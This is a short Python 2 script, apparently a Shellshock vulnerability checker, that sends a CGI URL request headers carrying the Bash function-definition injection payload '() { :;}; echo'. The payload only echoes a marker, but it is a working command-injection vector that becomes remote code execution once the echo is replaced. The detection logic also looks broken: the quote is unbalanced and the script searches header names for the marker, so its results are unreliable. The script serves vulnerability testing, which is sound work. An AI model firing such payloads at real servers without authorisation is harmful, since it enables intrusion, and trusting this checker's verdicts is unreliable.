# http_shellshock.py
# description: checks for Bash Specially-crafted Environment Variables Code Injection Vulnerability
# reference: http://www.exploit-db.com/exploits/34766/
# author: @shipcod3

import sys, requests

def usage():
    print "\n Usage: python http_shellshock.py http://localhost/cgi-bin/batibot"

def main(argv):
    if len(argv) < 2:
        return usage()

    url = sys.argv[1]

    headers = {
               "User-Agent": "() { :;}; echo 'shellshocked!",
               "Referer": "() { :;}; echo 'shellshocked!"
              }
    
    try:
        r = requests.get(url, headers=headers)
        print r.headers
        if 'shellshocked' in r.headers:
            print '[-] Vulnerable to Shellshock!'
        else:
            print '[-] Not Vulnerable!'

    except Exception as e:
        print "[+] Not Vulnerable!"

if __name__ == "__main__":
    main(sys.argv)
